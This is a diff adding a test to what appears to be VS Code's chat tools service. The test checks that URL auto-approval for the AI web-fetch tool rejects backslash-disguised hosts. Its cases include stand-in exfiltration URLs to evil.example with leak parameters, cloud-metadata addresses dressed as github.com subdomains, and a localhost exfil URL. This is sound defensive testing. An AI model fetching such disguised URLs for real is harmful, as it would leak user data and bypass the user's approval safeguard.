@@ -39,6 +39,8 @@ import { MockLanguageModelToolsConfirmationService } from '../../common/tools/mo
 import { IToolResultCompressor } from '../../../common/tools/toolResultCompressor.js';
 import { runWithFakedTimers } from '../../../../../../base/test/common/timeTravelScheduler.js';
 import { ILanguageModelChatMetadata } from '../../../common/languageModels.js';
+import { ChatUrlFetchingConfirmationContribution } from '../../../common/tools/builtinTools/chatUrlFetchingConfirmation.js';
+import { InternalFetchWebPageToolId } from '../../../common/tools/builtinTools/tools.js';
 
 // --- Test helpers to reduce repetition and improve readability ---
 
@@ -191,6 +193,7 @@ interface TestToolsServiceOptions {
 	commandService?: Partial<ICommandService>;
 	dialogService?: IDialogService;
 	configurationService?: TestConfigurationService;
+	confirmationService?: ILanguageModelToolsConfirmationService;
 	/** Called after configurationService is created but before the service is instantiated */
 	configureServices?: (config: TestConfigurationService) => void;
 }
@@ -213,7 +216,7 @@ function createTestToolsService(store: ReturnType<typeof ensureNoDisposablesAreL
 	const contextKeyService = instaService.get(IContextKeyService);
 	const chatService = new MockChatService();
 	instaService.stub(IChatService, chatService);
-	instaService.stub(ILanguageModelToolsConfirmationService, new MockLanguageModelToolsConfirmationService());
+	instaService.stub(ILanguageModelToolsConfirmationService, options?.confirmationService ?? new MockLanguageModelToolsConfirmationService());
 	instaService.stub(IToolResultCompressor, noopToolResultCompressor);
 	const riskAssessmentService = new TestChatToolRiskAssessmentService();
 	instaService.stub(IChatToolRiskAssessmentService, riskAssessmentService);
@@ -1730,6 +1733,72 @@ suite('LanguageModelToolsService', () => {
 		// Verify the tool completed and no accessibility signal was played
 		assert.strictEqual(result.content[0].value, 'auto approved');
 		assert.strictEqual(testAccessibilitySignalService.signalPlayedCalls.length, 0, 'accessibility signal should not be played when auto-approve is enabled');
+	});
+
+	test('URL auto-approval does not invoke tools for backslash-disguised destinations', async () => {
+		const config = new TestConfigurationService();
+		config.setUserConfiguration(ChatConfiguration.GlobalAutoApprove, false);
+		config.setUserConfiguration(ChatConfiguration.AutoApprovedUrls, {
+			'https://*.github.com': true,
+			'http://*.github.com:*': true,
+		});
+		const instantiationService = workbenchInstantiationService({ configurationService: () => config }, store);
+		const contribution = instantiationService.createInstance(
+			ChatUrlFetchingConfirmationContribution,
+			parameters => (parameters as { urls: string[] }).urls
+		);
+		const confirmationService = new MockLanguageModelToolsConfirmationService();
+		confirmationService.getPreConfirmAction = ref => contribution.getPreConfirmAction(ref);
+		const setup = createTestToolsService(store, { configurationService: config, confirmationService });
+		const destinations: string[] = [];
+		const tool = registerToolForTest(setup.service, store, InternalFetchWebPageToolId, {
+			prepareToolInvocation: async () => ({
+				confirmationMessages: { title: 'Fetch web page?', message: 'Confirm the destination', allowAutoConfirm: true },
+			}),
+			invoke: async invocation => {
+				const { urls } = invocation.parameters as { urls: string[] };
+				destinations.push(new URL(URI.parse(urls[0]).toString(true)).hostname);
+				return { content: [{ kind: 'text', value: 'Fixture content' }] };
+			},
+		});
+		const cases = [
+			{ url: 'https://evil.example/resource', destinations: [] },
+			{ url: String.raw`https://evil.example\.github.com/collect?leak=<data>`, destinations: [] },
+			{ url: String.raw`https://evil.example\\.github.com/collect?leak=<data>`, destinations: [] },
+			{ url: String.raw`https://169.254.169.254\.github.com/latest/meta-data/`, destinations: [] },
+			{ url: String.raw`https://169.254.169.254\\.github.com/latest/meta-data/`, destinations: [] },
+			{ url: String.raw`http://127.0.0.2:38651\.github.com/exfil?data=fixture`, destinations: [] },
+			{ url: String.raw`https://github.com\.evil.example/resource`, destinations: ['github.com'] },
+			{ url: 'https://api.github.com/resource', destinations: ['api.github.com'] },
+		];
+		const results: { url: string; destinations: string[]; skipped: boolean }[] = [];
+
+		for (const [index, { url }] of cases.entries()) {
+			const sessionId = `backslash-approval-${index}`;
+			const capture: { invocation?: ChatToolInvocation } = {};
+			stubGetSession(setup.chatService, sessionId, { capture });
+			const before = destinations.length;
+			const promise = setup.service.invokeTool(
+				tool.makeDto({ urls: [url] }, { sessionId }, `${index}`),
+				async () => 0,
+				CancellationToken.None
+			);
+			const published = await waitForPublishedInvocation(capture);
+			assert.ok(published, 'Expected the tool invocation to be published');
+			IChatToolInvocation.confirmWith(published, { type: ToolConfirmKind.Skipped });
+			const result = await promise;
+			results.push({
+				url,
+				destinations: destinations.slice(before),
+				skipped: result.content[0].value === 'The user chose to skip the tool call, they want to proceed without running it',
+			});
+		}
+
+		assert.deepStrictEqual(results, cases.map(({ url, destinations }) => ({
+			url,
+			destinations,
+			skipped: destinations.length === 0,
+		})));
 	});
 
 	test('autopilot permission level bypasses global auto-approve check', async () => {
